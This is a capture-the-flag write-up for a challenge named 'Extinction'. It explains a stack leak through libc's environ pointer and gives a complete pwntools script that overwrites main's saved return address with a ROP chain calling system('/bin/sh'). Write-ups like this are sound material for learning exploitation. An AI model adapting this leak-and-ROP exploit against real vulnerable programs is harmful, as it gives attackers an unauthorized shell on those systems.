## Extinction

We are given stack and libc leaks already. No hooks overwrite as glibc is modern.

1. We leak stack by modifying pointer of an existing email in bss, to libc's environ symbol. Then we just read all emails, and we will get stack leak.

2. We then just directly go for ROP, by overwriting saved RIP of main. Not sure why SHSTK didn't block this. From environ symbol, saved RIP was at -304, we ovewrite with ROP chain of pop_rdi, /bin/sh pointer, a ret to align stack, and finally system symbol address. 


```py
from pwn import *

exe = ELF("./exitnction_patched")
libc = ELF("./libc.so.6")
context.binary = exe

p = process([exe.path])

## get given leaks
p.sendline(b"server")
p.recvuntil(b"0x")
lic = int(p.recv(12).decode(),16)
p.recvuntil(b"0x")
exit = int(p.recv(12).decode(),16)

libc.address = exit - libc.sym["exit"]
exe.address = lic - exe.sym["current_license"]

log.info(f"PIE main at {hex(exe.sym["main"])}")
log.info(f"LIBC system at {hex(libc.sym["system"])}")

#8 byte write in subject of email
def write(addr, ct):
    p.recvuntil(b"> ")
    p.sendline(b"write")
    p.sendlineafter(b"0x", hex(addr).encode()[2:])
    p.sendlineafter(b"(8 chars): ", ct)
    p.sendlineafter(b": ", b"")

# 64 byte write in body of email
def write_long(addr, ct):
    p.recvuntil(b"> ")
    p.sendline(b"write")
    p.sendlineafter(b"0x", hex(addr).encode()[2:])
    p.sendlineafter(b"(8 chars): ", b"a")
    p.sendlineafter(b": ", ct)


write(exe.address + 0x4030, p64(libc.sym['environ'])) #now 3rd email pointer points to environ
p.sendline(b"read")
p.recvuntil(b"#3:\n")
stack = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"stack leak - {hex(stack)}")

#2 useless writes, just to increase sent_mails count.
write(libc.sym["__free_hook"],  b"abc") 
write(libc.sym["__free_hook"],  b"abc")

rop = ROP(libc)
pop_rdi = rop.rdi.address
bin_sh = next(libc.search(b"/bin/sh\0"))
write_long(stack-304,  p64(pop_rdi)+p64(bin_sh)+p64(rop.ret.address)+p64(libc.sym["system"]))
p.sendline(b"write")   #exit loop by sending 5th write, causing main to return.
p.interactive()
```